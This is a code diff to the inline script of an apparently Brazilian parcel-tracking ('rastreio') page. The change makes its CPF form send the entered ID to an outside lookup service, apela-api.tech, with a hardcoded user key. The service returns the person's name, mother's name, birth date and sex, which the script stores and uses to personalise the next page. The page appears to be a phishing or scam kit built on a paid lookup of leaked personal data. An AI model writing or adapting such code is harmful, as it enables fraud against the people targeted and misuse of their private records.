@@ -136,80 +136,87 @@
         }
     </style>
 
-<script>
-    document.addEventListener("DOMContentLoaded", () => {
-        const form = document.querySelector("form.e_formulario");
-        const inputCPF = document.getElementById("input_1734416045");
-        const btnConsultar = form.querySelector("button");
-        const errorDiv = form.querySelector(".gpc_campos-erro");
-        const textoErrorDiv = document.querySelector(".textoerror");
-    
-        inputCPF.addEventListener("input", (e) => {
-            let value = e.target.value.replace(/\D/g, "");
-            if (value.length > 3) value = value.replace(/(\d{3})(\d)/, "$1.$2");
-            if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
-            if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
-            e.target.value = value;
-        });
-    
-        const isValidCPF = (cpf) => cpf.replace(/\D/g, "").length === 11;
-    
-        btnConsultar.addEventListener("click", async (e) => {
-            e.preventDefault();
-    
-            const cpf = inputCPF.value.replace(/\D/g, "");
-    
-            errorDiv.classList.remove("active");
-            textoErrorDiv.classList.remove("active");
-            inputCPF.classList.remove("active");
-    
-            if (!isValidCPF(cpf)) {
-                inputCPF.classList.add("obrigatorio", "active");
-                errorDiv.classList.add("error", "active");
-                textoErrorDiv.classList.add("textoerror", "active");
-                textoErrorDiv.textContent = "CPF precisa ter 11 dígitos!";
-                return;
-            }
-    
-            try {
-                const response = await fetch("api.php", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                    body: new URLSearchParams({ cpf }),
-                });
-    
-                if (!response.ok) {
-                    throw new Error("Erro ao validar CPF!");
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form.e_formulario");
+            const inputCPF = document.getElementById("input_1734416045");
+            const btnConsultar = form.querySelector("button");
+            const errorDiv = form.querySelector(".gpc_campos-erro");
+            const textoErrorDiv = document.querySelector(".textoerror");
+
+            inputCPF.addEventListener("input", (e) => {
+                let value = e.target.value.replace(/\D/g, "");
+                if (value.length > 3) value = value.replace(/(\d{3})(\d)/, "$1.$2");
+                if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
+                if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+                e.target.value = value;
+            });
+
+            const isValidCPF = (cpf) => cpf.replace(/\D/g, "").length === 11;
+
+            btnConsultar.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const cpf = inputCPF.value.replace(/\D/g, "");
+
+                errorDiv.classList.remove("active");
+                textoErrorDiv.classList.remove("active");
+                inputCPF.classList.remove("active");
+
+                if (!isValidCPF(cpf)) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = "CPF precisa ter 11 dígitos!";
+                    return;
                 }
-    
-                const data = await response.json();
-    
-                if (data.status === 200) {
-                    const currentParams = new URLSearchParams(window.location.search);
-                    const hoje = new Date();
-                    const dia = String(hoje.getDate()).padStart(2, '0');
-                    const mes = String(hoje.getMonth() + 1).padStart(2, '0');
-                    const ano = hoje.getFullYear();
-                    const dataFormatada = `${dia}/${mes}/${ano}`;
-    
-                    currentParams.set("nome", encodeURIComponent(data.dadosBasicos.nome));
-                    currentParams.set("cpf", encodeURIComponent(cpf));
-                    currentParams.set("data_atual", dataFormatada);
-    
-                    window.location.href = `rastreio?${currentParams.toString()}`;
-                } else {
-                    throw new Error(data.message || "CPF incorreto! Digite novamente");
+
+                try {
+                    const url = `https://apela-api.tech?user=ab34229f-cd38-4621-97a9-6c1c7cbd354b&cpf=${cpf}`;
+                    const response = await fetch(url);
+
+                    if (!response.ok) {
+                        throw new Error("Erro ao consultar a API");
+                    }
+
+                    const data = await response.json();
+
+                    if (data.status === 200) {
+                        const hoje = new Date();
+                        const dia = String(hoje.getDate()).padStart(2, '0');
+                        const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+                        const ano = hoje.getFullYear();
+                        const dataFormatada = `${dia}/${mes}/${ano}`;
+
+                        localStorage.setItem("nome", data.nome);
+                        localStorage.setItem("cpf", cpf);
+                        localStorage.setItem("data_atual", dataFormatada);
+                        localStorage.setItem("mae", data.mae);
+                        localStorage.setItem("nascimento", data.nascimento);
+                        localStorage.setItem("sexo", data.sexo);
+                        localStorage.setItem("requisicoes_restantes", data.requisicoes_restantes);
+
+                        const currentParams = new URLSearchParams(window.location.search);
+                        currentParams.set("nome", encodeURIComponent(data.nome));
+                        currentParams.set("cpf", encodeURIComponent(cpf));
+                        currentParams.set("data_atual", dataFormatada);
+
+                        window.location.href = `rastreio?${currentParams.toString()}`;
+                    } else {
+                        throw new Error("CPF não encontrado. Tente novamente.");
+                    }
+                } catch (error) {
+                    inputCPF.classList.add("obrigatorio", "active");
+                    errorDiv.classList.add("error", "active");
+                    textoErrorDiv.classList.add("textoerror", "active");
+                    textoErrorDiv.textContent = error.message;
                 }
-            } catch (error) {
-                inputCPF.classList.add("obrigatorio", "active");
-                errorDiv.classList.add("error", "active");
-                textoErrorDiv.classList.add("textoerror", "active");
-                textoErrorDiv.textContent = error.message;
-            }
+            });
         });
-    });
     </script>
-    
+
+
+
 
 
 </body>
